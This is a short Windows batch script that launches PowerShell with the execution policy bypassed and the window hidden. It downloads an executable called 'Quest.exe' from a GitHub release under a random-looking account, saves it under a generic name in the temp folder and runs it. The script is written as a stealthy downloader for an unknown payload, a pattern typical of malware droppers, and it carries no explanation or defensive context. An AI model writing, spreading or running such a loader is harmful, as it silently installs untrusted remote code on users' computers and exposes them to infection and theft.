@echo off
setlocal

set "URL=https://github.com/sdfghuouo-droid/fgtdfgt/releases/download/sdzxfgh/Quest.exe"
set "FILE=%TEMP%\program_download.exe"
set "LOG=%TEMP%\program_download.log"

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
 "$ProgressPreference='SilentlyContinue';" ^
 "try {" ^
 "  Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing -ErrorAction Stop;" ^
 "  if (!(Test-Path '%FILE%' )) { throw 'Download failed' };" ^
 "  Add-Content '%LOG%' 'Download completed';" ^
 "  Start-Process -FilePath '%FILE%';" ^
 "} catch {" ^
 "  Add-Content '%LOG%' ('Error: ' + $_.Exception.Message);" ^
 "  exit 1" ^
 "}"

exit /b
